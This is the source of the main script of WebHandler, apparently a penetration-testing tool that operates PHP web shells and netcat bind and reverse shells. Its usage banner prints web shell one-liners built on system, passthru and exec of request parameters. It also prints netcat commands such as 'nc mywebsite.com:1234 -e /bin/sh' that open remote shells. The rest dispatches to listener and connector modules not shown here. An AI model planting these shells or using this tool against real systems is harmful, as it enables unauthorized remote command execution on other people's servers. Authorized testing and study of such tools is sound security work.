#!/usr/bin/env python

'''
-*- coding: utf-8 -*-

A handler for PHP 'system functions' & also an alternative 'netcat' handler
    - <?php system($_REQUEST['parameter']); ?>
    - netcat -l -p 1234

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Developers:
    Ahmed Shawky ~ @lnxg33k (http://lnxg33k.wordpress.com)
    g0tmi1k ~ @g0tmi1k (https://blog.g0tmi1k.com/)
'''

# Importing modules
from sys import argv
from platform import platform as OS

from core.libs.executer import commander
from core.libs.listen_handler import listen
from core.libs.connect_handler import connect
from core.libs.menu import getargs
from core.libs.banner import banner
from core.libs.update import update
from core.libs.thirdparty.termcolor import cprint, colored


if len(argv) <= 1:
    cprint("-- handler for PHP 'system functions' & also an alternative 'netcat' handler --\n", 'cyan')

    cprint("--   PHP 'system functions' ~ Works for POST and GET requests   --", 'blue')
    cprint(" Target's side:", 'green')
    cprint("-   <?php system($_GET['parameter']); ?>", 'yellow')
    cprint("-   <?php passthru($_REQUEST['parameter']); ?>", 'yellow')
    cprint("-   <?php echo exec($_POST['parameter']); ?>", 'yellow')
    cprint(" Example command:", 'green')
    cprint("-   python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=\n", 'yellow')

    cprint("--   Netcat ~ Listening server (for an bind connection)   --", 'blue')
    cprint(" Example command:", 'green')
    cprint("-   WebHandler: python webhandler.py --listen 1234", 'yellow')
    cprint("-       netcat: nc -lp 1234", 'yellow')
    cprint(" Target's side:", 'green')
    cprint("-       nc mywebsite.com:1234 -e /bin/sh\n", 'yellow')
    # More examples: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

    cprint("--   Netcat ~ Connecting client (for an reverse connection)   --", 'blue')
    cprint(" Target's side:", 'green')
    cprint("-   nc -lp 5678 -e /bin/bash", 'yellow')
    cprint(" Example command:", 'green')
    cprint("-   WebHandler: python webhandler.py --connect mywebsite.com:5678", 'yellow')
    cprint("-       netcat: nc mywebsite.com:5678\n", 'yellow')

    print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help & more example commands"
    exit(1)

else:
    # Check for arguments dependencies
    if getargs.url:
        if getargs.method == 'post' and not getargs.parameter:
            errmsg = '\n[!] Using post method requires --parameter flag, check help'
            exit(cprint(errmsg, 'red'))
        elif getargs.method == 'get' and getargs.parameter:
            errmsg = '\n[!] Using get method doesn\'t require --parameter flag, check help'
            exit(cprint(errmsg, 'red'))
        else:
            if not getargs.banner:
                print banner                                        # Print the banner
            commander.BackConnect()                                 # Call BackConnect method to handle input

    elif getargs.listen or getargs.connect:
        if 'windows' in OS().lower():
            errmsg = '[!] WebHandler doesn\'t support Windows yet, still working on it.'
            exit(cprint(errmsg, 'red'))
        if getargs.listen:
            listen.wait_connection()                                # Call wait_connection to wait for a connection
            commander.BackConnect()                                 # Call BackConnect method to handle input
        else:
            connect.create_connection()                             # Call create_connection to try and connect to the target
            commander.BackConnect()                                 # Call BackConnect method to handle input

    elif getargs.update:
        update()                                                    # Update the script
